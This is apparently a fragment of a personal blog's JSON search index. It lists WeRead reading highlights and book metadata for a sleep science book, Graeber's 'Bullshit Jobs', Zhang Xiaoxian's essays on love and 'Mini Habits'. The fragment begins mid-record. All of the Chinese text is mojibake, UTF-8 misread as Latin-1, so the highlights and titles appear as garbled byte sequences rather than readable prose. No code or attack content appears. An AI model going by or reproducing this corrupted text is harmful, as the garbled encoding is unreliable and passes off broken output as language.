02 å’–å•¡å› ã€æ—¶å·®å’Œè¤ªé»‘æ¿€ç´  æ€æ ·æ§åˆ¶ä½ çš„ç¡çœ èŠ‚å¥ 02 å’–å•¡å› ã€æ—¶å·®å’Œè¤ªé»‘æ¿€ç´  æ€æ ·æ§åˆ¶ä½ çš„ç¡çœ èŠ‚å¥ å¯¹ä¸€äº›äººæ¥è¯´ï¼Œä»–ä»¬åœ¨ç™½å¤©å¾ˆæ—©çš„æ—¶å€™å°±è¾¾åˆ°æ¸…é†’çŠ¶æ€çš„é«˜å³°ï¼Œè€Œç¡çœ çš„ä½è°·ä¹Ÿåœ¨å…¥å¤œåæ—©æ—©åˆ°æ¥ã€‚è¿™äº›éƒ½æ˜¯â€œæ™¨å‹äººâ€ï¼Œå¤§çº¦å æ€»äººå£æ•°çš„40%ã€‚ä»–ä»¬æ›´å€¾å‘äºåœ¨æ¸…æ™¨æ—¶åˆ†é†’æ¥ï¼Œå¹¶ä¸”å¾ˆä¹æ„è¿™æ ·åšï¼Œä»–ä»¬åœ¨ä¸€å¤©çš„è¿™ä¸ªæ—¶å€™ä¼šæ‹¥æœ‰æœ€ç†æƒ³çš„å·¥ä½œæ•ˆç‡ã€‚å¦ä¸€äº›äººåˆ™æ˜¯â€œå¤œå‹äººâ€ï¼Œçº¦å äººå£æ€»æ•°çš„30%ã€‚ä»–ä»¬æ›´å–œæ¬¢å¾ˆæ™šå…¥ç¡ï¼Œç¬¬äºŒå¤©ä¸Šåˆå¾ˆæ™šæ‰èµ·ï¼Œç”šè‡³ä¸‹åˆæ‰èµ·åºŠã€‚å‰©ä¸‹30%çš„äººå¤„äºæ—©æ™šä¸¤å‹ä¹‹é—´ï¼Œç¨å¾®å€¾å‘äºå¤œå‹äºº â€” åˆ›å»ºäº [[2022-04-29]] 08:48 ^37-6912-7098 02 å’–å•¡å› ã€æ—¶å·®å’Œè¤ªé»‘æ¿€ç´  æ€æ ·æ§åˆ¶ä½ çš„ç¡çœ èŠ‚å¥ ä½ çš„24å°æ—¶æ˜¼å¤œèŠ‚å¾‹æ˜¯å†³å®šæ¸…é†’å’Œç¡çœ çš„ä¸¤ä¸ªå› ç´ ä¹‹ä¸€ã€‚ç¬¬äºŒä¸ªå› ç´ å°±æ˜¯ç¡çœ å‹åŠ›ã€‚æ­¤æ—¶æ­¤åˆ»ï¼Œä¸€ç§å«ä½œè…ºè‹·çš„åŒ–å­¦ç‰©è´¨æ­£åœ¨ä½ çš„å¤§è„‘ä¸­é€æ¸ç§¯ç´¯ã€‚å®ƒä¼šéšç€æ¯ä¸€åˆ†é’Ÿçš„æµé€è€Œä¸æ–­å¢åŠ ã€‚ä½ é†’ç€çš„æ—¶é—´è¶Šä¹…ï¼Œè…ºè‹·å°±ä¼šç§¯ç´¯å¾—è¶Šå¤šã€‚ä½ å¯ä»¥æŠŠè…ºè‹·çœ‹ä½œæ˜¯ä¸€ç§åŒ–å­¦æŒ‡æ ‡ï¼Œå®ƒèƒ½æŒç»­è®°å½•ä½ ä»æ—©ä¸Šé†’æ¥ä¹‹åæ‰€åº¦è¿‡çš„æ—¶é—´ã€‚ â€” åˆ›å»ºäº [[2022-05-08]] 13:07 ^37-13095-13234 02 å’–å•¡å› ã€æ—¶å·®å’Œè¤ªé»‘æ¿€ç´  æ€æ ·æ§åˆ¶ä½ çš„ç¡çœ èŠ‚å¥ ç¬¬ä¸€é¢˜ï¼Œæ—©ä¸Šé†’æ¥åï¼Œä½ èƒ½åœ¨ä¸Šåˆ10ç‚¹æˆ–11ç‚¹å†æ¬¡ç¡ç€å—ï¼Ÿå¦‚æœç­”æ¡ˆæ˜¯â€œæ˜¯â€ï¼Œé‚£ä¹ˆä½ å¯èƒ½æ²¡æœ‰è¾¾åˆ°å……åˆ†çš„ç¡çœ æ—¶é—´æˆ–ç¡çœ è´¨é‡ä¸ä½³ã€‚ç¬¬äºŒé¢˜ï¼Œåœ¨ä¸­åˆä¹‹å‰ï¼Œä½ èƒ½ä¸èƒ½åœ¨ä¸æ‘„å…¥å’–å•¡å› çš„æƒ…å†µä¸‹ä¿æŒæœ€ä½³çŠ¶æ€ï¼Ÿå¦‚æœç­”æ¡ˆæ˜¯â€œä¸â€ï¼Œé‚£ä¹ˆä½ å¾ˆå¯èƒ½æ˜¯åœ¨ç§è‡ªç”¨å’–å•¡å› ç±»è¯ç‰©æ¥åº”å¯¹é•¿æœŸç¡çœ ä¸è¶³ã€‚ â€” åˆ›å»ºäº [[2022-05-18]] 12:08 ^37-20894-21023 03 ç¡çœ çš„å®šä¹‰å’Œå½¢æˆ æ—¶é—´è†¨èƒ€ä¸1952å¹´ä¸€ä¸ªå…³äºå©´å„¿çš„å‘ç° 03 ç¡çœ çš„å®šä¹‰å’Œå½¢æˆ æ—¶é—´è†¨èƒ€ä¸1952å¹´ä¸€ä¸ªå…³äºå©´å„¿çš„å‘ç° åœ¨å‰åŠå¤œå æ®ä¸»å¯¼åœ°ä½çš„æ·±åº¦éå¿«é€Ÿçœ¼åŠ¨ç¡çœ çš„ä¸€ä¸ªå…³é”®åŠŸèƒ½æ˜¯æ·˜æ±°å’Œå»é™¤ä¸å¿…è¦çš„ç¥ç»è¿æ¥ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œåœ¨æ™šäº›æ—¶å€™å¼€å§‹å ä¸Šé£çš„å¿«é€Ÿçœ¼åŠ¨ç¡çœ çš„åšæ¢¦é˜¶æ®µï¼Œåˆ™åœ¨åŠ å¼ºè¿™äº›è¿æ¥æ–¹é¢èµ·ç€é‡è¦ä½œç”¨ã€‚ â€” åˆ›å»ºäº [[2022-05-20]] 13:18 ^38-6713-6800 03 ç¡çœ çš„å®šä¹‰å’Œå½¢æˆ æ—¶é—´è†¨èƒ€ä¸1952å¹´ä¸€ä¸ªå…³äºå©´å„¿çš„å‘ç° å› ä¸ºä½ çš„å¤§è„‘æœ€æ¸´æœ›çš„å¤§éƒ¨åˆ†å¿«é€Ÿçœ¼åŠ¨ç¡çœ éƒ½è¢«å®‰æ’åœ¨äº†å¤œæ™šçš„æœ€åä¸€æ®µæ—¶é—´é‡Œï¼Œä¹Ÿå°±æ˜¯æ—©æ™¨çš„æ™šäº›æ—¶å€™ï¼Œæ‰€ä»¥å³ä½¿ä½ çš„ç¡çœ æ—¶é—´åªå‡å°‘äº†25%ï¼Œä½ ä¹Ÿä¼šæŸå¤±60%åˆ°90%çš„å¿«é€Ÿçœ¼åŠ¨ç¡çœ ã€‚è¿™å…¶å®æ˜¯åŒå‘çš„ã€‚å¦‚æœä½ åœ¨æ—©ä¸Š8ç‚¹é†’æ¥ï¼Œä½†æ˜¯ç›´åˆ°å‡Œæ™¨2ç‚¹æ‰ä¸ŠåºŠç¡è§‰ï¼Œé‚£ä¹ˆä½ å°±ä¼šå¤±å»å¤§é‡çš„æ·±åº¦éå¿«é€Ÿçœ¼åŠ¨ç¡çœ ã€‚ â€” åˆ›å»ºäº [[2022-05-20]] 08:48 ^38-7832-7970 06 ä½ çš„æ¯äº²å’Œèå£«æ¯”äºšéƒ½çŸ¥é“ ç¡çœ å¯¹å¤§è„‘çš„ç›Šå¤„ 06 ä½ çš„æ¯äº²å’Œèå£«æ¯”äºšéƒ½çŸ¥é“ ç¡çœ å¯¹å¤§è„‘çš„ç›Šå¤„ åœ¨ç¡è§‰ä¹‹å‰ï¼Œä½ å¯ä»¥å›é¡¾å½“å¤©çš„å­¦ä¹ ç»å†ï¼Œç„¶ååªä»åˆ—è¡¨ä¸­é€‰æ‹©ä½ æƒ³è¦å¢å¼ºçš„è®°å¿†ã€‚ä¸‹å®Œè®¢å•å°±å»ç¡è§‰ï¼Œä½ çŸ¥é“ä½ çš„è®¢å•å°†åœ¨ä¸€å¤œä¹‹é—´å‡†å¤‡å¥½ã€‚å½“ä½ æ—©æ™¨é†’æ¥æ—¶ï¼Œå¤§è„‘åªå¢å¼ºäº†ä½ ç§äººè®¢åˆ¶çš„å½“æ—¥ç²¾é€‰é¡¹ç›®ã€‚å¦‚æ­¤ï¼Œä½ æœ‰é€‰æ‹©åœ°åªå¢å¼ºäº†æƒ³è¦ä¿ç•™çš„ä¸ªåˆ«è®°å¿†ã€‚ â€” åˆ›å»ºäº [[2022-05-29]] 00:44 ^42-11031-11143 06 ä½ çš„æ¯äº²å’Œèå£«æ¯”äºšéƒ½çŸ¥é“ ç¡çœ å¯¹å¤§è„‘çš„ç›Šå¤„ ç¡çœ ä¸ä¼šæä¾›ä¸€å¤©ä¸­æ‰€æœ‰ä¿¡æ¯çš„æ™®éã€éç‰¹å®šçš„ï¼ˆå› è€Œå†—é•¿çš„ï¼‰ä¿å­˜æœåŠ¡ã€‚ç›¸åï¼Œç¡çœ èƒ½å¤Ÿæä¾›ä¸€ä¸ªæ›´æœ‰è¾¨è¯†èƒ½åŠ›çš„è¾…åŠ©æ–¹æ³•æ¥æ”¹å–„è®°å¿†ï¼šä¼˜å…ˆæŒ‘å‡ºå“ªäº›ä¿¡æ¯éœ€è¦æˆ–ä¸éœ€è¦æœ€ç»ˆåŠ å¼ºã€‚ç¡çœ é€šè¿‡ä½¿ç”¨åœ¨æœ€åˆå­¦ä¹ æ—¶æŒ‚åœ¨è¿™äº›è®°å¿†ä¸Šçš„â€œæœ‰æ„ä¹‰â€çš„æ ‡ç­¾æ¥å®ŒæˆæŒ‘é€‰ï¼Œæˆ–è€…å¯èƒ½åœ¨ç¡çœ æœŸé—´å†å¯¹æ ‡ç­¾æ„ä¹‰è¿›è¡Œè¯†åˆ«ã€‚ â€” åˆ›å»ºäº [[2022-05-29]] 02:39 ^42-13647-13781 10 ä½œä¸ºå¤œé—´ç–—æ³•çš„æ¢¦ 10 ä½œä¸ºå¤œé—´ç–—æ³•çš„æ¢¦ å¿«é€Ÿçœ¼åŠ¨ç¡çœ æ—¶çš„æ¢¦ä¼šä»ä½ ç™½å¤©ç»å†çš„å›°éš¾ï¼Œç”šè‡³æ˜¯åˆ›ä¼¤æ€§çš„æƒ…ç»ªäº‹ä»¶ä¸­æŠŠä»¤ä½ ç—›è‹¦çš„åˆºå‰”é™¤ï¼Œäºæ˜¯ç¬¬äºŒå¤©æ—©æ™¨é†’æ¥æ—¶ï¼Œä½ çš„æƒ…ç»ªé—®é¢˜å°±èƒ½å¾—åˆ°ç¼“è§£ã€‚ â€” åˆ›å»ºäº [[2023-01-01]] 23:28 ^47-1868-1934","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç§‘å­¦æŠ€æœ¯","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç§‘å­¦æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF/"}]},{"title":"æ¯«æ— æ„ä¹‰çš„å·¥ä½œ","date":"2024-08-31T01:35:29.344Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç¤¾ä¼šæ–‡åŒ–/æ¯«æ— æ„ä¹‰çš„å·¥ä½œ-å¤§å«Â·æ ¼é›·ä¼¯/","text":"ä½œè€…ï¼šå¤§å«Â·æ ¼é›·ä¼¯ - å†…å®¹ç®€ä»‹ ã€Šæ¯«æ— æ„ä¹‰çš„å·¥ä½œã€‹ å‡¯æ©æ–¯æ›¾åœ¨20ä¸–çºª30å¹´ä»£é¢„è¨€ï¼šåˆ°20ä¸–çºªæœ«ï¼Œç§‘æŠ€æ°´å¹³å°†è¶³å¤Ÿè¿›æ­¥ï¼Œäººä»¬æ¯å‘¨çš„å·¥ä½œæ—¶é•¿ä¼šç¼©çŸ­è‡³15å°æ—¶ã€‚ä½†å¦‚ä»Šï¼Œäººä»¬åœ¨å·¥ä½œä¸ŠèŠ±è´¹äº†æ›´å¤šæ—¶é—´ã€‚ ä½ çš„å·¥ä½œå¯¹ä¸–ç•Œåšå‡ºè´¡çŒ®äº†å—ï¼Ÿ2013å¹´ï¼Œå¤§å«Â·æ ¼é›·ä¼¯åœ¨ã€Šè°ˆè°ˆâ€œç‹—å±å·¥ä½œâ€ç°è±¡ã€‹ä¸€æ–‡ä¸­æå‡ºäº†è¿™ä¸ªå°–é”çš„é—®é¢˜ï¼Œåœ¨å‡ å‘¨å†…æ”¶è·äº†è¶…è¿‡ç™¾ä¸‡æ¬¡çš„é˜…è¯»ç‚¹å‡»ï¼Œå¹¶è¢«ç¿»è¯‘æˆåå‡ ç§è¯­è¨€ã€‚ç›´åˆ°ç°åœ¨ï¼Œå®ƒä»ç„¶æ˜¯äººä»¬æ·±åˆ‡å…³æ³¨çš„è®®é¢˜ã€‚ æ˜¯è°åœ¨åˆ›é€ è¿™äº›æ¯«æ— æ„ä¹‰çš„å·¥ä½œï¼Ÿå®ƒæ˜¯å¦‚ä½•é™ä½æ•ˆç‡ï¼Œé˜»ç¢ä¸ªäººä»·å€¼çš„å®ç°ï¼ŒåŠ å‰§ä¸å…¬å¹³çš„ï¼Ÿåœ¨è¿™æœ¬ä¹¦ä¸­ï¼Œä½œè€…ä»¥çŠ€åˆ©çš„ç¬”è§¦ï¼Œå°†è‡ªå·±çš„è§‚å¯Ÿã€ç ”ç©¶ä¸åæ€æ‚‰æ•°å‘ˆç°ï¼Œå‰–æäº†å›°æ‰°ä¸–äººçš„å½“ä»£ç¤¾ä¼šç—…ç¶ã€‚ æ¯«æ— æ„ä¹‰çš„å·¥ä½œ + ã€Šæ¯«æ— æ„ä¹‰çš„å·¥ä½œã€‹ å±æ€§ å†…å®¹ ISBN 9787521743883 ä½œè€… å¤§å«Â·æ ¼é›·ä¼¯ å‡ºç‰ˆå¹´ 2022-07-01 å‡ºç‰ˆç¤¾ ä¸­ä¿¡å‡ºç‰ˆé›†å›¢ æ¥æº æ¯«æ— æ„ä¹‰çš„å·¥ä½œ åˆ†ç±» ç¤¾ä¼šæ–‡åŒ–-ç¤¾ç§‘ é«˜äº®åˆ’çº¿ æ¨èåº ä¸è¦è¿·å¤±åœ¨â€œåˆ†é…æ€§åŠªåŠ›â€ä¸­ æ¨èåº ä¸è¦è¿·å¤±åœ¨â€œåˆ†é…æ€§åŠªåŠ›â€ä¸­ æˆ‘ä»¬äººç±»ç¤¾ä¼šåœ¨å¤§èµ„æœ¬çš„æ“æ§ä¸‹ï¼Œä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™äº›æ‘§æ¯åŠ³åŠ¨ä»·å€¼çš„â€œæ–°å·¥ä½œâ€ï¼Œè®©æ— æ•°äººå®è´µçš„ç”Ÿå‘½åœ¨æ— æ„ä¹‰ä¸­æ—‹è½¬ï¼Ÿè¿™å……ç›ˆç€é“ä¹‰æ„Ÿçš„å–é—®ï¼Œç¬é—´æ­å¼€äº†â€œåå·¥ä¸šç¤¾ä¼šâ€éšè—çš„ç—…ç—‡ï¼Œä½¿å¤ªå¤šçš„äººå å…¥è‡ªæˆ‘ä»·å€¼çš„ç—›è‹¦æ€è™‘ä¸­ã€‚ â€” åˆ›å»ºäº [[2023-01-02]] 16:07 ^4-1720-1820","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç¤¾ä¼šæ–‡åŒ–","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç¤¾ä¼šæ–‡åŒ–","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%A4%BE%E4%BC%9A%E6%96%87%E5%8C%96/"}]},{"title":"å¼ å°å¨´ï¼šå†™ç»™å¥³æ€§çš„çˆ±æƒ…ç‰©è¯­ï¼ˆå…±2å†Œï¼‰","date":"2024-08-31T01:35:29.337Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç”Ÿæ´»ç™¾ç§‘/å¼ å°å¨´ï¼šå†™ç»™å¥³æ€§çš„çˆ±æƒ…ç‰©è¯­ï¼ˆå…±2å†Œï¼‰-å¼ å°å¨´/","text":"ä½œè€…ï¼šå¼ å°å¨´ - å†…å®¹ç®€ä»‹ ã€Šå¼ å°å¨´ï¼šå†™ç»™å¥³æ€§çš„çˆ±æƒ…ç‰©è¯­ï¼ˆå…±2å†Œï¼‰ã€‹ å¥—è£…å…±2å†Œï¼Œåˆ†åˆ«ä¸ºã€Šè¯·è‡³å°‘çˆ±ä¸€ä¸ªåƒç”·äººçš„ç”·äººã€‹ã€Šåªè¦ä½ å¤Ÿå¼ºå¤§å°±å¥½ã€‹ã€‚ã€Šè¯·è‡³å°‘çˆ±ä¸€ä¸ªåƒç”·äººçš„ç”·äººã€‹ï¼šæˆ‘ä»¬æ€»æ˜¯å…ˆæ´»ç»™åˆ«äººçœ‹ï¼Œåæ¥æ‰æ‡‚å¾—æ´»ç»™è‡ªå·±çœ‹ã€‚æ—¥å­æ¼«é•¿ï¼Œé’æ˜¥ä¸å†ï¼Œä¸€ç”Ÿçš„æ—¶å…‰å¦‚è®¸æœ‰é™ï¼Œè¯·ä¸è¦è’å‡‰äº†ä½ è‡ªå·±ã€‚é•¿å¤œå¯‚å¯¥ï¼Œå¦‚æœå¯ä»¥ï¼Œä¸ºä»€ä¹ˆè¦å­¤å•ï¼Ÿå¯ä»–å¿…é¡»æ˜¯ä½ çˆ±çš„äººã€‚å¯æƒœï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªäººéƒ½é‚£ä¹ˆå¹¸è¿ï¼Œä¸€å¼€å§‹å°±é‡åˆ°å¯¹çš„äººã€‚ä¸è¦åªçˆ±ä¸€ä¸ªå¥½äººï¼Œä¸è¦åªçˆ±ä¸€ä¸ªä¼˜ç§€çš„ç”·äººï¼Œä¸è¦åªçˆ±ä¸€ä¸ªæœ‰æ‰åçš„ç”·äººï¼Œä¸è¦åªçˆ±ä¸€ä¸ªæœ‰è¶£çš„ç”·äººï¼Œä¸è¦åªçˆ±ä¸€ä¸ªæ¡ä»¶å¾ˆå¥½çš„ç”·äººï¼Œä¸è¦åªçˆ±ä¸€ä¸ªè‚¯è¿å°±ä½ çš„ç”·äººï¼Œä¹Ÿä¸è¦åªçˆ±ä¸€ä¸ªçˆ±ä½ å’Œç–¼ä½ çš„ç”·äººï¼Œè¯·ä½ ä¸€å®šçˆ±ä¸€ä¸ªæœ‰æ‹…å½“çš„ç”·äººã€‚çˆ±ä¸€ä¸ªä½ çˆ±ä¹Ÿçˆ±ä½ çš„ç”·äººï¼Œçˆ±ä¸€ä¸ªå¯¹ä½ å¥½çš„ï¼Œçˆ±ä¸€ä¸ªèªæ˜æœ‰æ™ºæ…§ã€ä¸æ–­è¿›æ­¥çš„ç”·äººï¼Œçˆ±ä¸€ä¸ªå–„è‰¯çš„ç”·äººï¼Œçˆ±ä¸€ä¸ªæœ‰æ‰¿æ‹…çš„ç”·äººï¼Œæˆ–è€…è‡³å°‘ï¼Œçˆ±ä¸€ä¸ªåƒç”·äººçš„ç”·äººå§ã€‚æ·±æƒ…ä¸æ˜¯é‡æ‹…ï¼Œè€Œæ˜¯æ‹…å½“ã€‚ä»€ä¹ˆéƒ½ä¼šå¹»ç­ï¼Œçˆ±æƒ…ä¹Ÿä¼šæœ‰è€å»çš„ä¸€å¤©ï¼Œä¸€ä¸ªæœ‰æ‹…å½“çš„ç”·äººæ‰ä¸ä¼šå¯¹ä½ ä½¿åï¼Œæ‰å€¼å¾—ä½ ä¸ä»–å¹¶è‚©ã€‚ä»–ä¸€ç›´éƒ½åœ¨ï¼Œæ˜¨æ—¥å¤©æ¶¯ï¼Œæ¥æ—¥å’«å°ºã€‚ã€Šåªè¦ä½ å¤Ÿå¼ºå¤§å°±å¥½ã€‹ï¼šå¼ å°å¨´å†™ç»™æ–°æ—¶ä»£å¥³æ€§çš„ç‹¬ç«‹ç®´è¨€ã€‚ä½ å¯ä»¥ä»»æ€§ï¼Œä½ å¯ä»¥æµªæ¼«ï¼Œä½ å¯ä»¥å®å¯åœ¨çˆ±æƒ…ä¸­è€å»ä¹Ÿä¸è¦è‹Ÿä¸”è¿‡æ—¥å­ï¼Œä½ å¯ä»¥ä¾ç„¶çˆ±æ†åˆ†æ˜ï¼Œä½ å¯ä»¥åœ¨å©šå§»é‡Œç»§ç»­è¿½å¯»çˆ±æƒ…ï¼Œä½ å¯ä»¥åšç€ä¸–äººè®¤ä¸ºè¿™ä¸ªå¹´çºªä¸è¯¥åšçš„äº‹ã€‚ä¸€åˆ‡ä¸€åˆ‡ï¼Œåªè¦ä½ å¤Ÿå¼ºå¤§å°±å¥½ã€‚ä½ è¦ä¸€ç›´å‘å‰èµ°ï¼Œè¿‡å¥½è¿™ä¸€ç”Ÿã€‚ä»æ¥å°±æ²¡æœ‰äººè¦æ±‚ä½ è¦æœ‰å¤šæ£’ï¼Œè€Œæ˜¯ä½ ä¸æ¥å—è‡ªå·±ä¸å¤Ÿå¥½ã€‚è¯·ä½ å°½é‡æå‡è‡ªå·±çš„çœ¼å…‰å’Œå“å‘³ï¼Œè¯·ä½ å°½é‡é£ç¿”å§ã€‚ å¼ å°å¨´ï¼šå†™ç»™å¥³æ€§çš„çˆ±æƒ…ç‰©è¯­ï¼ˆå…±2å†Œï¼‰ + ã€Šå¼ å°å¨´ï¼šå†™ç»™å¥³æ€§çš„çˆ±æƒ…ç‰©è¯­ï¼ˆå…±2å†Œï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN null ä½œè€… å¼ å°å¨´ å‡ºç‰ˆå¹´ 2021-07-01 å‡ºç‰ˆç¤¾ å¤©æ´¥åšé›†æ–°åª’ç§‘æŠ€æœ‰é™å…¬å¸ æ¥æº å¼ å°å¨´ï¼šå†™ç»™å¥³æ€§çš„çˆ±æƒ…ç‰©è¯­ï¼ˆå…±2å†Œï¼‰ åˆ†ç±» ç”Ÿæ´»ç™¾ç§‘-æƒ…æ„Ÿ é«˜äº®åˆ’çº¿ æˆ‘ä¸å®³æ€•è€å»ï¼Œå› ä¸ºä½ è§è¿‡æˆ‘é’æ˜¥å¹´å°‘çš„å®¹é¢œ æˆ‘ä¸å®³æ€•è€å»ï¼Œå› ä¸ºä½ è§è¿‡æˆ‘é’æ˜¥å¹´å°‘çš„å®¹é¢œ å‡è‹¥ä¼šå†è§åˆ°ä½ ï¼Œæˆ‘ä¸å®³æ€•è€å»ï¼Œå› ä¸ºä½ è§è¿‡æˆ‘é’æ˜¥å¹´å°‘çš„å®¹é¢œã€‚ â€” åˆ›å»ºäº [[2021-08-27]] 23:14 ^21-2521-2550","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç”Ÿæ´»ç™¾ç§‘","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç”Ÿæ´»ç™¾ç§‘","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%94%9F%E6%B4%BB%E7%99%BE%E7%A7%91/"}]},{"title":"å¾®ä¹ æƒ¯ï¼ˆ1å¤©1ä¸ªä¿¯å§æ’‘ã€1å¤©è¯»1é¡µä¹¦â€¦â€¦æ¯å¤©åªåšä¸€ç‚¹ç‚¹çš„æ— è´Ÿæ‹…ä¹ æƒ¯ç­–ç•¥ï¼Œç®€å•åˆ°ä¸å¯èƒ½å¤±è´¥çš„è‡ªæˆ‘ç®¡ç†æ³•åˆ™ï¼ï¼‰","date":"2024-08-31T01:35:29.335Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æœªåˆ†ç±»/å¾®ä¹ æƒ¯ï¼ˆ1å¤©1ä¸ªä¿¯å§æ’‘ã€1å¤©è¯»1é¡µä¹¦â€¦â€¦æ¯å¤©åªåšä¸€ç‚¹ç‚¹çš„æ— è´Ÿæ‹…ä¹ æƒ¯ç­–ç•¥ï¼Œç®€å•åˆ°ä¸å¯èƒ½å¤±è´¥çš„è‡ªæˆ‘ç®¡ç†æ³•åˆ™ï¼ï¼‰-æ–¯è’‚èŠ¬Â·ç›–æ–¯/","text":"ä½œè€…ï¼šæ–¯è’‚èŠ¬Â·ç›–æ–¯ - å†…å®¹ç®€ä»‹ ã€Šå¾®ä¹ æƒ¯ï¼ˆ1å¤©1ä¸ªä¿¯å§æ’‘ã€1å¤©è¯»1é¡µä¹¦â€¦â€¦æ¯å¤©åªåšä¸€ç‚¹ç‚¹çš„æ— è´Ÿæ‹…ä¹ æƒ¯ç­–ç•¥ï¼Œç®€å•åˆ°ä¸å¯èƒ½å¤±è´¥çš„è‡ªæˆ‘ç®¡ç†æ³•åˆ™ï¼ï¼‰ã€‹ å¾®ä¹ æƒ¯ï¼ˆ1å¤©1ä¸ªä¿¯å§æ’‘ã€1å¤©è¯»1é¡µä¹¦â€¦â€¦æ¯å¤©åªåšä¸€ç‚¹ç‚¹çš„æ— è´Ÿæ‹…ä¹ æƒ¯ç­–ç•¥ï¼Œç®€å•åˆ°ä¸å¯èƒ½å¤±è´¥çš„è‡ªæˆ‘ç®¡ç†æ³•åˆ™ï¼ï¼‰ + ã€Šå¾®ä¹ æƒ¯ï¼ˆ1å¤©1ä¸ªä¿¯å§æ’‘ã€1å¤©è¯»1é¡µä¹¦â€¦â€¦æ¯å¤©åªåšä¸€ç‚¹ç‚¹çš„æ— è´Ÿæ‹…ä¹ æƒ¯ç­–ç•¥ï¼Œç®€å•åˆ°ä¸å¯èƒ½å¤±è´¥çš„è‡ªæˆ‘ç®¡ç†æ³•åˆ™ï¼ï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN null ä½œè€… æ–¯è’‚èŠ¬Â·ç›–æ–¯ å‡ºç‰ˆå¹´ å‡ºç‰ˆç¤¾ æ±Ÿè¥¿äººæ°‘å‡ºç‰ˆç¤¾ æ¥æº å¾®ä¹ æƒ¯ï¼ˆ1å¤©1ä¸ªä¿¯å§æ’‘ã€1å¤©è¯»1é¡µä¹¦â€¦â€¦æ¯å¤©åªåšä¸€ç‚¹ç‚¹çš„æ— è´Ÿæ‹…ä¹ æƒ¯ç­–ç•¥ï¼Œç®€å•åˆ°ä¸å¯èƒ½å¤±è´¥çš„è‡ªæˆ‘ç®¡ç†æ³•åˆ™ï¼ï¼‰ åˆ†ç±» é«˜äº®åˆ’çº¿ ç¬¬1ç«  å¾®ä¹ æƒ¯æ˜¯ä»€ä¹ˆ ç¬¬1ç«  å¾®ä¹ æƒ¯æ˜¯ä»€ä¹ˆ æ¯å¤©è‡³å°‘è¯»ä¸¤é¡µè¿™æœ¬ä¹¦ï¼Œç›´åˆ°è¯»å®Œä¸ºæ­¢ â€” åˆ›å»ºäº [[2024-07-22]] 11:33 ^3-822-839 ç¬¬1ç«  å¾®ä¹ æƒ¯æ˜¯ä»€ä¹ˆ æ¯ä¸€ä¸ªä¼Ÿå¤§çš„æˆå°±éƒ½å»ºç«‹åœ¨ä¹‹å‰æ‰“å¥½çš„åŸºç¡€ä¹‹ä¸Šã€‚è¿½æ ¹æº¯æºï¼Œä½ ä¼šå‘ç°ä¸€åˆ‡éƒ½å§‹äºé‚£ä¸€å°æ­¥ â€” åˆ›å»ºäº [[2024-07-31]] 18:06 